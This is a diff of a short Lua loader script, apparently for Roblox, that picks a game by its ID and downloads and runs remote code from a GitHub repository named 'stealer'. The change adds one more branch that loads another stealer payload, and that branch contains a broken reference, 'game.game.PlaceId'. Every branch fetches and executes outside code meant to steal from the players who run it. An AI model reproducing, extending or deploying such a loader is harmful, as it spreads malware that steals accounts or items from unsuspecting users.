@@ -1,9 +1,11 @@
 if run then
     task.delay(1, run)
 elseif game.GameId == 10200395747 then
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/horizon-gag2"))()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/horizon-gag2"))() 
 elseif game.PlaceId == 142823291 then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/horizon-mm2"))()
 elseif game.PlaceId == 920587237 then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/horizon-ame"))()
+elseif game.game.PlaceId == 126884695634066 then
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/temphor/stealer/refs/heads/main/horizon-gag"))()
 end
